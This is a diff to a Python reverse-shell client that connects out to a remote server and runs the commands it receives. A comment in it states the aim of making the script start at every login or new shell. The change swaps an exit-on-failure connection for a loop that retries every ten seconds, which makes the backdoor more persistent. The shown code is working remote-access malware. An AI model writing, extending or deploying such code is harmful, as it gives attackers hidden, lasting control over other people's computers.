@@ -1,4 +1,5 @@
 import socket, subprocess, os, sys
+from time import sleep, time
 '''
 First, make this script start every time the user starts their computer, or a new shell.
 '''
@@ -41,13 +42,17 @@ elif len(sys.argv) == 3:
     except:
         print("Can not cast port to int!")
 
-#If the server is down, end the program.
-try:
-    s = socket.socket() #Establish socket connection
-    s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server
-except:
-    exit()
+DISCONNECTED = True
+while DISCONNECTED:
+    #If the server is down, keep trying.
+    try:
+        s = socket.socket() #Establish socket connection
+        s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server
+        DISCONNECTED = False
+    except:
+        sleep(10) #Try to join the server every 10 seconds
 
+#When finally connected, start our shell
 while True:
     command = s.recv(BUFFER_SIZE).decode() #Recieve the command from the server and decode it into a string
     splitted_command = command.split() #Split the command
